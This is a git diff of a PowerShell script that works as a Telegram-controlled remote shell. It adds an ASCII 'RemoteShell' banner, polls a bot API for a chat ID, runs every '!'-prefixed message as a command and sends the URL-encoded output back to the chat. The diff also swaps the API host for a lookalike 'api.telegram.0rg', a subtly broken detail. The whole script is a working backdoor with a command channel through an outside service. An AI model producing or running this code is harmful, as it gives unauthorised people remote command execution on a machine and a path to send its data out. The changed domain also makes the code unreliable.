@@ -1,10 +1,21 @@
 Clear-Host
-Write-Host "[*] Waiting for Telegram commands..." -ForegroundColor Yellow
+Write-Host "____/\\\\\\\\\_______________________________________________________________________________________/\\\\\\\\\\\____/\\\_________________________/\\\\\\_____/\\\\\\____" -ForegroundColor Cyan
+Write-Host "__/\\\///////\\\___________________________________________________________________________________/\\\/////////\\\_\/\\\________________________\////\\\____\////\\\____" -ForegroundColor Cyan
+Write-Host " _\/\\\_____\/\\\________________________________________________________/\\\______________________\//\\\______\///__\/\\\___________________________\/\\\_______\/\\\____" -ForegroundColor Cyan
+Write-Host "  _\/\\\\\\\\\\\/________/\\\\\\\\_____/\\\\\__/\\\\\_______/\\\\\_____/\\\\\\\\\\\_____/\\\\\\\\____\////\\\_________\/\\\_____________/\\\\\\\\_____\/\\\_______\/\\\____" -ForegroundColor Cyan
+Write-Host "   _\/\\\//////\\\______/\\\/////\\\__/\\\///\\\\\///\\\___/\\\///\\\__\////\\\////____/\\\/////\\\______\////\\\______\/\\\\\\\\\\____/\\\/////\\\____\/\\\_______\/\\\____" -ForegroundColor Green
+Write-Host "    _\/\\\____\//\\\____/\\\\\\\\\\\__\/\\\_\//\\\__\/\\\__/\\\__\//\\\____\/\\\_______/\\\\\\\\\\\__________\////\\\___\/\\\/////\\\__/\\\\\\\\\\\_____\/\\\_______\/\\\____" -ForegroundColor Green
+Write-Host "     _\/\\\_____\//\\\__\//\\\\///////___\/\\\__\/\\\__\/\\\_\//\\\__/\\\_____\/\\\_/\\__\//\\///////____/\\\______\//\\\__\/\\\___\/\\\_\//\\///////______\/\\\_______\/\\\____" -ForegroundColor Green
+Write-Host "      _\/\\\______\//\\\__\//\\\\\\\\\\_\/\\\__\/\\\__\/\\\__\///\\\\\/______\//\\\\\____\//\\\\\\\\\\_\///\\\\\\\\\\\/___\/\\\___\/\\\__\//\\\\\\\\\\__/\\\\\\\\\__/\\\\\\\\\_" -ForegroundColor Cyan
+Write-Host "       _\///________\///____\//////////__\///___\///___\///_____\/////_________\/////______\//////////____\///////////_____\///____\///____\//////////__\/////////__\/////////__" -ForegroundColor Cyan
+Write-Host ""
+Write-Host "==================================================================================================================================================================" -ForegroundColor DarkGray
+Write-Host "[*] Status: ESP32 Remote Shell // Establishing encrypted Telegram tunnel..." -ForegroundColor Yellow
 
 $chatId = $null
 while (-not $chatId) {
     try {
-        $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$Token/getUpdates" -ErrorAction Stop
+        $updates = Invoke-RestMethod -Uri "https://api.telegram.0rg/bot$Token/getUpdates" -ErrorAction Stop
         if ($updates.ok -and $updates.result.Count -gt 0) {
             $chatId = $updates.result[-1].message.chat.id
         }
@@ -12,7 +23,7 @@ while (-not $chatId) {
     if (-not $chatId) { Start-Sleep 2 }
 }
 
-Write-Host "[+] Got Chat ID: $chatId! Agent active..." -ForegroundColor Green
+Write-Host "[+] Connected! Target Chat ID: $chatId" -ForegroundColor Green
 $lastUpdateId = 0
 
 while ($true) {
@@ -28,7 +39,7 @@ while ($true) {
                 
                 if ($msgText -and $msgText.StartsWith('!')) {
                     $cmd = $msgText.Substring(1)
-                    Write-Host "[+] Running: $cmd" -ForegroundColor Cyan
+                    Write-Host "[+] Executing: $cmd" -ForegroundColor Magenta
                     
                     $output = ""
                     try {
@@ -36,7 +47,7 @@ while ($true) {
                     } catch {
                         $output = $_.Exception.Message
                     }
-                    if (-not $output) { $output = "[Done]" }
+                    if (-not $output) { $output = "[Command executed with no output]" }
                     
                     Write-Host $output -ForegroundColor White
                     $encodedOut = [System.Web.HttpUtility]::UrlEncode("`n$output")
